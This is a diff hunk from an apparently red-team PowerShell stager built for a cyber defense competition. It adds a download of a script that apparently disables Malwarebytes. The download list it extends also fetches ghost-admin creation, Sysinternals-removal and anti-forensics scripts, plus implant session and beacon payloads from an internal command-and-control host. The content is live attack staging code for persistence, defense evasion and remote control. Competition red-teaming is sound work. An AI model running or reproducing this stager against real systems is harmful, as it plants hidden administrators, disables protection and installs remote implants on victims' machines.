@@ -16,6 +16,7 @@ $downloads = @(
     @{ Uri = "https://raw.githubusercontent.com/Whitneyk7878/CCDC_Red_Team_Tools/refs/heads/main/Phase_3_Tools/General_Scripts/SetupScripts/windows/CCDC_Windows_P3_CreateGhostAdmins.ps1";       OutFile = "ghostadmins.ps1" },
     @{ Uri = "https://raw.githubusercontent.com/Whitneyk7878/CCDC_Red_Team_Tools/refs/heads/main/Phase_1_Tools/General_Scripts/SetupScripts/windows/CCDC_Windows_SysInternals_SysInternalsNuker.ps1"; OutFile = "sysnuker.ps1" },
     @{ Uri = "https://raw.githubusercontent.com/Whitneyk7878/CCDC_Red_Team_Tools/refs/heads/main/Phase_3_Tools/General_Scripts/SetupScripts/windows/CCDC_Windows_P3_AntiForensics_MemoryHole.ps1"; OutFile = "antiforensics.ps1" },
+    @{ Uri = "https://raw.githubusercontent.com/Whitneyk7878/CCDC_Red_Team_Tools/refs/heads/main/Phase_3_Tools/General_Scripts/SetupScripts/windows/CCDC_Windows_P3_MalwareBytes_NoByteForYou.ps1"; OutFile = "mbnobyte.ps1" },
     @{ Uri = "http://172.31.40.6:8882/IMPLANT_SESSION_WINDOWS_HTTP_8008";  OutFile = "ses08" },
     @{ Uri = "http://172.31.40.6:8882/IMPLANT_BEACON_WINDOWS_HTTP_8007";   OutFile = "beac07" }
 )
